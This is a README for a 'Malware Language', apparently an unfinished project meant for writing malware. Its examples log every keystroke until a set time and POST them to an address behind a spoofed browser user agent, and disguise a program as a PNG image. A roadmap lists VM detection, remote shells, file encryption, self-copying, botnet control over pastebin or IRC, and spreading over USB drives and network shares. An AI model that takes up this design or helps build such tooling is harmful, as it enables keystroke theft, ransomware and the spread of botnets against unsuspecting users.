# Malware Language

Language only is buildable in nix enivorments.

### Example code
Basic example
```
use system; @ Imports exit
use keyboard; @ Imports lock, unlock
use window; @ Imports notify

main:{
 keyboard.lock(); @ Locks the keyboard 

 window.notify("Oh hi mark!"); @ Utilizes builtin function

 keyboard.unlock(); @ Unlocks the keyboard
 system.exit();
}
```

Network POST example
```
use system; @ Imports exit
use keyboard; @ Imports log
use network; @ Imports POST
use time; @ Imports until

main:{
 wait:(time.until("22:00")){ @ Waits until 22:00 today before exiting
  info := keyboard.log(); @ Logs everything the user enters
 }

 network.set_user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"); @ Updates the user agent for this request
 network.POST("address", "port", info); @ Will send whatever the user entered 

 system.exit(); @ Exits the program
}
```

Transform example
```
use system;
use object;
use window;

main:{
 object.set_header_target("png"); @ Will result in the end product being identified as a png
 object.set_extension(".png"); @ Sets the program extension
 
 window.notify("Hello, World!"); @ Prints "Hello, World!" to the screen

 system.exit(); @ Exits the program
}
```

## General ideas on what more the language can do
1. Includes tools to check if the malware is running in a vm, what kind of vm(?)
2.Include options to open socket to target, send commands and retrieve results, copy files, mv files etc.
3. Be able to write to specific disk blocks, write & read from the disk.
4. Encrypt files and decryptions methods. Should contain multiple different encryptions methods
5. Able to copy the executable to different locaitons
6. Metasploit compatability? Being able to run metasploit scripts?
7. Using pastebin for sending commands to zombies in a botnet.
8. IRC for sending commands to zombies in a botnet(?)
9. Copy to usb
10. Copy accross network shared folders

## The compiler should then be able to
1. List arguments for the compiler, `-h`
2. Target plattform, windows, nix
